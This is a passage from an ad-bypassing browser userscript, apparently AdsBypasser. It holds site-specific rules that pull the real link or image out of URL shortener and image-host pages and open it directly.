    host: /^thinfi\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('div p a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^tinyarrows\.com$/,
    path: /^\/preview\.php$/,
    query: /^\?page=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(decodeURIComponent(m.query[1]));
  },
});
$.register({
  rule: {
    host: /^topload\.pro$/,
  },
  ready: function () {
    'use strict';
    var a = $('.hide a.btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?totaldebrid\.org$/,
    path:/\/l\/(l\.php)?$/,
    query: /\?ads=([a-zA-Z0-9=]+)$/,
  },
  start: function (m) {
    'use strict';
    var l = atob(m.query[1]);
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^(www\.)?typ\.me$/,
  },
  ready: function (m) {
    'use strict';
    var a = $('#skipAdBtn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?ultshare\.com$/,
    path: /^\/(?:(?:\d-)?(\d+)|index\.php)$/,
    query: /^(?:\?a=\d&c=(\d+))?$/
  },
  start: function (m) {
    'use strict';
    var linkId = m.path[1]?m.path[1]:m.query[1];
    var directLink = '/3-' + linkId;
    $.openLink(directLink);
  },
});
$.register({
  rule: {
    host: /^unfake\.it$/,
  },
  ready: function () {
    'use strict';
    var frame = $('frame');
    var i = frame.src.lastIndexOf('http://');
    $.openLink(frame.src.substr(i));
  },
});
$.register({
  rule: {
    host: /^(www\.)?(upan|gxp)\.so$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var a = $('table.td_line a[onclick="down_process_s();"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^url\.ie$/,
  },
  ready: function () {
    'use strict';
    var a = $('a[title="Link to original URL"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: [
      /^urlcash\.(com|net|org)$/,
      /^(bat5|detonating|celebclk|eightteen|smilinglinks|peekatmygirlfriend|pornyhost|clb1|urlgalleries)\.com$/,
      /^looble\.net$/,
      /^xxxs\.org$/,
    ],
  },
  ready: function () {
    'use strict';
    if ($.window && $.window.linkDestUrl) {
      $.openLink($.window.linkDestUrl);
      return;
    }
    var matches = document.body.innerHTML.match(/linkDestUrl = '(.+)'/);
    if (matches) {
      $.openLink(matches[1]);
      return;
    }
  },
});
$.register({
  rule: {
    host: /^urlinn\.com$/,
  },
  ready: function () {
    'use strict';
    var m = $('META[HTTP-EQUIV=refresh]').getAttribute('CONTENT').match(/url='([^']+)'/);
    if (m) {
      $.openLink(m[1]);
    }
  },
});
$.register({
  rule: {
    host: /^urlms\.com$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('#content');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?urlv2\.com$/,
  },
  ready: function (m) {
    'use strict';
    if (window.location.pathname.indexOf('locked') >= 0) {
      var path = window.location.pathname.replace('/locked', '');
      $.openLink(path);
      return;
    }
    var m = $.searchScripts(/jeton=([\w]+)/);
    var l = 'http://urlv2.com/algo.php?action=passer&px=0&so=1&jeton=' + m[1];
    window.setTimeout(function() {$.openLink(l)}, 5000);
  },
});
$.register({
  rule: {
    host: /^(www\.)?uskip\.me$/,
    path: /^\/go\/\w+$/,
  },
  ready: function (m) {
    'use strict';
    var a = $('#btn-main');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^vavi\.co$/,
  },
  ready: function () {
    'use strict';
    var l = $('#goLink');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?victly\.com$/,
    path: /^\/\w+$/,
  },
  start: function () {
    'use strict';
    $.post(document.location.href, {
      hidden: '',
      image: 'Skip+Ads',
    }).then(function (text) {
      var m = text.match(/window\.location\.replace\('([^']+)'\)/);
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: {
    host: /^www\.viidii\.info$/,
  },
  ready: function () {
    'use strict';
    var o = $('#directlink');
    $.openLink(o.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?vir\.al$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var target_url = '([^']+)';/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?wzzq\.me$/,
  },
  ready: function () {
    'use strict';
    try {
      var l = $('#img_loading_table2  div.wz_img_hit a[target=_blank]').href;
      $.openLink(l);
    } catch (e) {
    }
  },
});
$.register({
  rule: {
    host: /^xlink\.me$/
  },
  ready: function () {
    'use strict';
    var a = $('#main_form > center > a');
    if (!a) {return;}
    $.openLink(a.href);
  },
});
$.register({
  rule: 'http://yep.it/preview.php?p=*',
  ready: function () {
    'use strict';
    var link = $('font[color="grey"]').innerHTML;
    $.openLink(link);
  },
});
$.register({
  rule: 'http://www.yooclick.com/l/*',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var uniq = $.window.uniq || $.window.uniqi;
    if (!uniq) {return;}
    var path = window.location.pathname;
    var url = _.T('{0}?ajax=true&adblock=false&old=false&framed=false&uniq={1}')(path, uniq);
    var getURL = function() {
      $.get(url).then(function (text) {
        var goodURL = /^(https?|ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(\#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(text);
        if (goodURL) {
          $.openLink(text);
        } else {
          setTimeout(getURL, 500);
        }
      });
    }
    getURL();
  },
});
$.register({
  rule: {
    host: /^ysf\.pl$/,
    path: /^\/3\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^ysf\.pl$/,
    path: /^\/2\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = m.path[1].match(/.{2}/g).map(function (h) {
      return String.fromCharCode(parseInt(h, 16));
    }).join('');
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^www\.zintata\.com$/,
    path: /^\/link\/$/,
  },
  ready: function () {
    'use strict';
    var a = $('#one > center:nth-child(3) > a:nth-child(1)');
    $.openLink(a.href);
  },
});
$.register({
  rule: 'http://zo.mu/redirector/process?link=*',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    window.location.reload();
  },
});
$.register({
  rule: {
    host: /^zzz\.gl$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var domainurl = '([^']+)';/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    $.openLink(m[1]);
  },
});
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var _ = require('lodash');
      var core = require('./core.js');
      var dom = require('./dom.js');
      var config = require('./config.js');
      var link = require('./link.js');
      var misc = require('./misc.js');
      var modules = [dom, config, link, misc].map(function (v) {
        return v.call(null, context, GM);
      });
      var $ = _.assign.apply(_, modules);
      return factory(context, GM, core, $);
    };
  } else {
    factory(context, {
      getResourceText: GM_getResourceText,
      addStyle: GM_addStyle,
      getResourceURL: GM_getResourceURL,
    }, context._, context.$);
  }
}(this, function (context, GM, _, $) {
  'use strict';
  var window = context.window;
  var document = window.document;
  $.openImage = function (imgSrc, options) {
    options = options || {};
    var replace = !!options.replace;
    var referer = !!options.referer;
    if (replace) {
      replaceBody(imgSrc);
      return;
    }
    if ($.config.redirectImage) {
      $.openLink(imgSrc, {
        referer: referer,
      });
    }
  };
  function enableScrolling () {
    var o = document.compatMode === 'CSS1Compat' ? document.documentElement : document.body;
    o.style.overflow = '';
  };
  function toggleShrinking () {
    this.classList.toggle('adsbypasser-shrinked');
  }
  function checkScaling () {
    var nw = this.naturalWidth;
    var nh = this.naturalHeight;
    var cw = document.documentElement.clientWidth;
    var ch = document.documentElement.clientHeight;
    if ((nw > cw || nh > ch) && !this.classList.contains('adsbypasser-resizable')) {
      this.classList.add('adsbypasser-resizable');
      this.classList.add('adsbypasser-shrinked');
      this.addEventListener('click', toggleShrinking);
    } else {
      this.removeEventListener('click', toggleShrinking);
      this.classList.remove('adsbypasser-shrinked');
      this.classList.remove('adsbypasser-resizable');
    }
  }
  function scaleImage (i) {
    var style = GM.getResourceText('scaleImage');
    GM.addStyle(style);
    if (i.naturalWidth && i.naturalHeight) {
      checkScaling.call(i);
    } else {
      i.addEventListener('load', checkScaling);
    }
    var h;
    window.addEventListener('resize', function () {
      window.clearTimeout(h);
      h = window.setTimeout(checkScaling.bind(i), 100);
    });
  }
  function changeBackground () {
    var bgImage = GM.getResourceURL('bgImage');
    document.body.style.backgroundColor = '#222222';
    document.body.style.backgroundImage = _.T('url(\'{0}\')')(bgImage);
  }
  function alignCenter () {
    var style = GM.getResourceText('alignCenter');
    GM.addStyle(style);
  }
  function injectStyle (d, i) {
    $.removeNodes('style, link[rel=stylesheet]');
    d.id = 'adsbypasser-wrapper';
    i.id = 'adsbypasser-image';
  }
  function replaceBody (imgSrc) {
    if (!$.config.redirectImage) {
      return;
    }
    if (!imgSrc) {
      _.warn('false url');
      return;
    }
    _.info(_.T('replacing body with `{0}` ...')(imgSrc));
    $.removeAllTimer();
    enableScrolling();
    document.body = document.createElement('body');
    var d = document.createElement('div');
    document.body.appendChild(d);
    var i = document.createElement('img');
    i.src = imgSrc;
    d.appendChild(i);
    if ($.config.alignCenter || $.config.scaleImage) {
      injectStyle(d, i);
    }
    if ($.config.alignCenter) {
      alignCenter();
    }
    if ($.config.changeBackground) {
      changeBackground();
    }
    if ($.config.scaleImage) {
      scaleImage(i);
    }
  };
  return $;
}));
$.register({
  rule: [
    {
      host: /^1(dl|be)\.biz$/,
      path: /^\/\w\.php$/,
      query: /^\?\w\/\d+$/,
    },
    {
      host: /^img\.1dl\.biz$/,
      path: /^\/\w\.php$/,
      query: /^\?\w\/([\d\/]+)$/,
    },
  ],
  ready: function () {
    'use strict';
    var a = $('.main a, .main-l a');
    $.openImage(a.href, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^1pics\.ru$/,
  },
  ready: function () {
    'use strict';
    var img = $('img[alt$="1Pics.Ru"]');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^www\.(2i\.(sk|cz)|2imgs\.com)$/,
  },
  ready: function () {
    'use strict';
    var img = $('#wrap3 img');
    $.openImage(img.src);
  },
});
(function () {
  'use strict';
  function run () {
    var i = $('#image');
    $.openImage(i.src);
  }
  $.register({
    rule: {
      host: /^(www\.)?image(pearl|crest)\.com$/,
      path: /^\/verify\/(.+)$/,
    },
    start: function (m) {
      $.openLink('/view/' + m.path[1]);
    },
  });
  $.register({
    rule: [
      'http://*.abload.de/image.php?img=*',
      'http://www.imageup.ru/*/*/*.html',
      'http://itmages.ru/image/view/*/*',
      {
        host: /^(www\.)?image(pearl|crest)\.com$/,
        path: /^\/view\//,
      },
    ],
    ready: run,
  });
})();
$.register({
  rule: {
    host: /^avenuexxx\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('#content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^(b4he|fullimg)\.com/,
      /^fastpics\.net/,
      /^ifap\.co/,
    ],
    query: /^\?v=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/images/' + m.query[1]);
  },
});
$.register({
  rule: {
    host: /^imagep2p\.com$/,
    query: /^\?v=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/images/' + m.query[1] + '.jpeg');
  },
});
$.register({
  rule: {
    host: /^bayimg\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('#mainImage');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^beeimg\.com$/,
    path: /\/view\/.*/,
  },
  ready: function () {
    'use strict';
    var img = $('img.img-responsive');
    $.openImage(img.src);
  },
});
$.register({
  rule: 'http://www.bilder-space.de/*.htm',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var img = $('img.picture');
    $.openImage(img.src);
  },
});
$.register({
  rule: 'http://www.bilder-upload.eu/show.php?file=*',
  ready: function () {
    'use strict';
    var i = $('input[type=image]');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://blackcatpix.com/v.php?*',
  ready: function () {
    'use strict';
    var img = $('td center img');
    $.openImage(img.src);
  },
});
$.register({
  rule: 'http://www.casimages.com/img.php?*',
  ready: function () {
    'use strict';
    var img = $('td a img');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: [
      /^www\.x45x\.info$/,
      /^(imadul|mypixxx\.lonestarnaughtygirls)\.com$/,
      /^ghanaimages\.co$/,
      /^imgurban\.info$/,
      /^d69\.in$/,
    ],
    query: /\?p[mt]=(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/?di=' + m.query[1]);
  },
});
$.register({
  rule: 'http://javelite.tk/viewer.php?id=*',
  ready: function () {
    'use strict';
    var i = $('table img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^imgchili\.(com|net)$/,
      /^(www\.)?pixhost\.org$/,
    ],
    path: /^\/show\//,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe, #ad');
    try {
      $('#all').style.display = '';
    } catch (e) {
    }
    var o = $('#show_image, #image');
    $.openImage(o.src);
  },
});
$.register({
  rule: {
    host: /^crd\.ht$/,
  },
  ready: function () {
    'use strict';
    var i = $('.continue > form > input[name=link]');
    $.openImage(i.value);
  },
});
$.register({
  rule: 'http://cubeupload.com/im/*',
  ready: function () {
    'use strict';
    var img = $('img.galleryBigImg');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: [
      /^dailyss\.net$/,
      /daily-img\.com$/,
      /img-365\.com$/,
      /^365-img\.com$/,
      /^i\.hentai-ddl\.org$/,
    ],
    path: /^\/image\/.+$/,
  },
  ready: function () {
    'use strict';
    var i = $('#image-viewer-container img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^xxx\.porn0day\.com$/,
    path: /^\/image\/.+$/,
  },
  ready: function () {
    'use strict';
    var i = $('link[rel^=image_src]');
    $.openImage(i.href);
  },
});
$.register({
  rule: {
    host: [
      /^depic\.me$/,
      /^(www\.)?picamatic\.com$/,
    ],
  },
  ready: function () {
    'use strict';
    var i = $('#pic');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^img(dino|tiger|zap)\.com$/,
    path: /^\/viewer\.php$/,
    query: /^\?file=/,
  },
  ready: function () {
    'use strict';
    var o = $('#cursor_lupa');
    $.openImage(o.src);
  },
});
$.register({
  rule: 'http://*.directupload.net/file/*.htm',
  ready: function () {
    'use strict';
    var i = $('#ImgFrame');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^ehdwallpapers\.org$/,
    path: /^\/images\/.*$/,
  },
  ready: function () {
    'use strict';
    var i = $('.entry-content.clearfix img');
    $.openImage(i.src);
  },
});
$.register({
  rule: [
    {
      host: [
        /^(emptypix|imgdomino)\.com$/,
        /^overdream\.cz$/,
        /^www\.sexseeimage\.com$/,
      ],
      path: /^\/image\//,
    },
    {
      host: /^10\.imageleon\.com$/,
      path: /^\/img-(.+)\.html$/,
    },
  ],
  ready: function () {
    'use strict';
    var img = $('#full_image');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^sexyxpixels\.com$/,
    query: /^\?v=/,
  },
  ready: function () {
    'use strict';
    var img = $('#full_image');
    $.openImage(img.src, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^fastpic\.ru$/,
    path: /^\/view\//,
  },
  ready: function () {
    'use strict';
    var img = $('#picContainer #image');
    $.openImage(img.src, {
      referer: true,
    });
  },
});
$.register({
  rule: 'http://www.fotolink.su/v.php?id=*',
  ready: function () {
    'use strict';
    var i = $('#content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://www.fotosik.pl/pokaz_obrazek/pelny/*.html',
  ready: function () {
    'use strict';
    var i = $('a.noborder img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^freakimage\.com$/,
      /^www\.hostpic\.org$/,
    ],
    path: /^\/view\.php$/,
    query: /^\?filename=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/images/' + m.query[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?freeimgup\.com$/,
    path: /^\/xxx\//,
  },
  ready: function () {
    'use strict';
    var img = $('#mainimage');
    $.openImage(img.src);
  },
});
$.register({
  rule: [
    'http://funkyimg.com/viewer.php?img=*',
    'http://funkyimg.com/view/*',
  ],
  ready: function () {
    'use strict';
    var i = $('#viewer img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?gallery(nova|sense)\.se$/,
    path: /^\/site\/v\//,
  },
  ready: function () {
    'use strict';
    var i = $('#myUniqueImg').parentNode;
    $.openImage(i.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?gallerynova\.se$/,
    path: /^\/site\/viewImage\/(\w+)/,
  },
  ready: function (m) {
    'use strict';
    var confirm = $.searchScripts(/\$\("#confirmImage"\).val\("([^"]+)"\)/)[1];
    $.post('/site/viewConfirmCode/' + m.path[1], {
      confirm: confirm
    }).then(function (rawJson) {
      var json = _.parseJSON(rawJson);
      var decodedHTML = document.createTextNode(json.content).data;
      var imgURL = decodedHTML.match(/<a href="([^"]+)" target="_blank">/)[1];
      $.openImage(imgURL);
    });
  },
});
(function () {
  'use strict';
  var hostRule = /^goimagehost\.com$/;
  $.register({
    rule: {
      host: hostRule,
      path: /^\/xxx\/images\//,
    },
  });
  $.register({
    rule: {
      host: hostRule,
      path: /^\/xxx\/(.+)/,
    },
    start: function (m) {
      $.openImage('/xxx/images/' + m.path[1]);
    },
  });
  $.register({
    rule: {
      host: hostRule,
      query: /^\?v=(.+)/,
    },
    start: function (m) {
      $.openImage('/xxx/images/' + m.query[1]);
    },
  });
})();
$.register({
  rule: {
    host: /^www\.(h-animes|adultmove)\.info/,
    path: /^\/.+\/.+\/.+\.html$/,
  },
  ready: function () {
    'use strict';
    var a = $('.dlbutton2 > a');
    $.openImage(a.href);
  },
});
$.register({
  rule: 'http://hentaimg.com/mg/lndex-1.php?img=*',
  ready: function () {
    'use strict';
    $.openLink('index-1.php' + window.location.search);
  },
});
$.register({
  rule: 'http://hentaimg.com/mg/index-1.php?img=*',
  ready: function () {
    'use strict';
    var i = $('#content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://www.hostingpics.net/viewer.php?id=*',
  ready: function () {
    'use strict';
    var i = $('#img_viewer');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://ifotos.pl/zobacz/*',
  ready: function () {
    'use strict';
    var m = $('meta[property="og:image"]');
    $.openImage(m.content);
  },
});
$.register({
  rule: {
    host: /^ima\.so$/,
  },
  ready: function () {
    'use strict';
    var a = $('#image_block a');
    $.openImage(a.href);
  },
});
$.register({
  rule: [
    'http://image18.org/show/*',
    'http://screenlist.ru/details.php?image_id=*',
    'http://www.imagenetz.de/*/*.html',
  ],
  ready: function () {
    'use strict';
    var img = $('#picture');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^image2you\.ru$/,
    path: /^\/\d+\/\d+/,
  },
  ready: function () {
    'use strict';
    var i = $.$('div.t_tips2 div > img');
    if (!i) {
      $.openLink('', {
        post: {
          _confirm: '',
        },
      });
      return;
    }
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imagearn.com/image.php?id=*',
  ready: function () {
    'use strict';
    var i = $('#img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://www.imagebam.com/image/*',
  ready: function () {
    'use strict';
    var o = $('.image-container img[id]');
    $.openImage(o.src, {
      replace: true,
    });
  },
});
$.register({
  rule: {
    host: [
      /^imageheli\.com$/,
      /^imgtube\.net$/,
      /^pixliv\.com$/,
    ],
    path: /^\/img-([a-zA-Z0-9\-]+)\..+$/,
  },
  ready: function () {
    'use strict';
    var a = $.$('a[rel="lightbox"]');
    if (!a) {
      $.openLink('', {
        post: {
          browser_fingerprint: '',
          ads: '0',
        },
      });
      return;
    }
    $.openImage(a.href);
  },
});
$.register({
  rule: 'http://www.imagehousing.com/image/*',
  ready: function () {
    'use strict';
    var i = $('td.text_item img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imageno.com/*.html',
  ready: function () {
    'use strict';
    var i = $('#image_div img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imagepix.org/image/*.html',
  ready: function () {
    'use strict';
    var i = $('img[border="0"]');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function run () {
    var o = $('#download_box img[id]');
    $.openImage(o.src);
  }
  $.register({
    rule: {
      host: /^www\.imageporter\.com$/,
      path: /^\/\w{12}\/.*\.html$/,
    },
    ready: run,
  });
  $.register({
    rule: {
      host: /^(www\.)?(image(carry|dunk|porter|switch)|pic(leet|turedip|tureturn)|imgspice)\.com|(piclambo|yankoimages)\.net$/,
    },
    ready: run,
  });
})();
$.register({
  rule: [
    {
      host: /^imagescream\.com$/,
      path: /^\/img\/(soft\/)?/,
    },
    {
      host: /^(www\.)?(picturescream|picturevip)\.com$/,
      path: /^\/x\//,
    },
    {
      host: [
        /^picturescream\.asia$/,
        /^uploadimage\.eu$/,
      ],
    },
    {
      host: /^postscreens\.info/,
      path: /^\/.*/,
    },
  ],
  ready: function () {
    'use strict';
    var i = $('#shortURL-content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^(imagescream|anonpic)\.com$/,
      /^all-poster\.ru$/,
    ],
    query: /^\?v=/,
  },
  ready: function () {
    'use strict';
    var i = $('#imagen img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^bunnyforum\.org$/,
    query: /^\?v=/,
  },
  ready: function () {
    'use strict';
    var i = $('img[title^=Click]');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  var host = /^imageshack\.us$/;
  $.register({
    rule: {
      host: host,
      path: /^\/photo\/.+\/(.+)\/([^\/]+)/,
    },
    start: function (m) {
      $.openImage(_.T('/f/{0}/{1}/')(m.path[1], m.path[2]));
    },
  });
  $.register({
    rule: {
      host: host,
      path: /^\/f\/.+\/[^\/]+/,
    },
    ready: function () {
      var i = $('#fullimg');
      $.openImage(i.src);
    },
  });
})();
$.register({
  rule: 'http://imageshost.ru/photo/*/id*.html',
  ready: function () {
    'use strict';
    var a = $('#bphoto a');
    $.openImage(a.href);
  },
});
(function () {
  'use strict';
  function run () {
    var i = $('#img_obj');
    $.openImage(i.src, {
      referer: true,
    });
  }
  function run2 () {
    var i = $('#img_obj');
    $.openImage(i.src, {
      replace: true,
    });
  }
  $.register({
    rule: [
      {
        host: [
          /^www\.(freebunker|imgcarry|imgshots)\.com$/,
          /^www\.imagesnake\.(com|org)$/,
        ],
        path: /^\/show\.php$/,
        query: /^\?/,
      },
      {
        host: /^www\.(freebunker|imgshots)\.com$/,
        path: /^\/show\//,
      },
      {
        host: [
          /^www\.imagesnake\.(com|org)$/,
          /^www\.imagefruit\.com$/,
        ],
        path: /^\/(img|show)\/.+/,
      },
      {
        host: /^imageban\.(ru|net)$/,
        path: /^\/show\/\d{4}\/\d{2}\/\d{2}\/.+/,
      },
      'http://fotoo.pl/show.php?img=*.html',
      {
        host: /^www\.(fotoszok\.pl|imagestime)\.com$/,
        path: /^\/show\.php\/.*\.html$/,
      },
    ],
    ready: run,
  });
  $.register({
    rule: {
      host: /^www\.imgcarry\.com$/,
      path: /^\/show\//,
    },
    ready: run2,
  });
})();
(function () {
  'use strict';
  function run (rp) {
    if ($.window.jQuery) {
      $.window.jQuery.prototype.append = undefined;
    }
    var i = $('img.pic');
    $.openImage(i.src, {
      replace: rp,
    });
  }
  $.register({
    rule: {
      host: /^imagenpic\.com$/,
      path: /^\/.*\/.+\.html?$/,
    },
    ready: _.P(run, true),
  });
  $.register({
    rule: {
      host: /^imagecherry\.com$/,
    },
    ready: _.P(run, true),
  });
  $.register({
    rule: {
      host: /^imagetwist\.com$/,
    },
    ready: _.P(run, false),
  });
})();
$.register({
  rule: 'http://imageupper.com/i/?*',
  ready: function () {
    'use strict';
    var i = $('#img');
    $.openImage(i.src);
  },
});
$.register({
  rule: [
    'http://*.imagevenue.com/img.php?*',
    'http://hotchyx.com/d/adult-image-hosting-view-08.php?id=*',
    'http://www.hostingfailov.com/photo/*',
  ],
  ready: function () {
    'use strict';
    var i = $('#thepic');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^imagezilla\.net$/,
  },
  ready: function () {
    'use strict';
    var i = $('#photo');
    $.openImage(i.src, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^imagik\.fr$/,
    path: /^\/view(-rl)?\/(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/uploads/' + m.path[2]);
  },
});
$.register({
  rule: 'http://img.3ezy.net/*.htm',
  ready: function () {
    'use strict';
    var l = $('link[rel="image_src"]');
    $.openImage(l.href);
  },
});
$.register({
  rule: 'http://img1.imagilive.com/*/*',
  ready: function () {
    'use strict';
    var a = $.$('#page a.button');
    if (a) {
      $.redirect(a.href);
      return;
    }
    var i = $('#page > img:not([id])');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^img24\.org$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('img.img-polaroid + form');
    if (f) {
      f.submit();
      return;
    }
    f = $('img.img-polaroid');
    $.openImage(f.src, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^img3x\.net$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('form');
    if (f) {
      f.submit();
      return;
    }
    f = $('#show_image');
    $.openImage(f.src);
  },
});
$.register({
  rule: {
    host: /^www\.img(babes|flare)\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $.$('input[onclick]');
    if (i) {
      $.window.Decode();
      return;
    }
    var i = $('#this_image');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^imgbar\.net$/,
    path: /^\/img_show\.php$/,
    query: /^\?view_id=/,
  },
  ready: function () {
    'use strict';
    var i = $('center img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^imgbar\.net$/,
  },
  ready: function () {
    'use strict';
    var i = $('div.panel.top form input[name=sid]');
    $.openLink('/img_show.php?view_id=' + i.value);
  },
});
$.register({
  rule: {
    host: /^imgbin\.me$/,
    path: /^\/view\/([A-Z]+)$/,
  },
  start: function (m) {
    'use strict';
    var tpl = _.T('/image/{0}.jpg');
    $.openImage(tpl(m.path[1]));
  },
});
$.register({
  rule: {
    host: /^imgbox\.com$/,
    path: /^\/[\d\w]+$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var i = $('#img');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function helper (doReplace) {
    if ($.window.confirmAge) {
      $.window.confirmAge(1);
      return;
    }
    var i = $('#container-home img[onclick]');
    $.openImage(i.src, {
      replace: doReplace,
    });
  }
  $.register({
    rule: {
      host: [
        /^img(fantasy|leech|\.pornleech|smile|nemo|sense|curl)\.com$/,
        /^(imagedomino|lovechix|imagebic)\.com$/,
        /^0img\.net$/,
        /^daily-img\.com$/,
        /^picangel\.in$/,
        /^bunnyforum\.org$/,
      ],
      query: /^\?[pv]=/,
    },
    ready: _.P(helper, false),
  });
  $.register({
    rule: {
      host: /^imgsay\.com$/,
      query: /^\?[pv]=/,
    },
    ready: _.P(helper, true),
  });
})();
$.register({
  rule: {
    host: /^imglocker\.com$/,
    path: [
      /^(\/\w+)\/(.+)\.html$/,
      /^(\/\w+)\/(.+)$/,
    ],
  },
  start: function (m) {
    'use strict';
    var url = _.T('//img.imglocker.com{0}_{1}');
    $.openImage(url(m.path[1], m.path[2]));
  },
});
$.register({
  rule: {
    host: [
      /^imgnova\.xyz$/,
      /^www\.hentai-hot\.xyz$/,
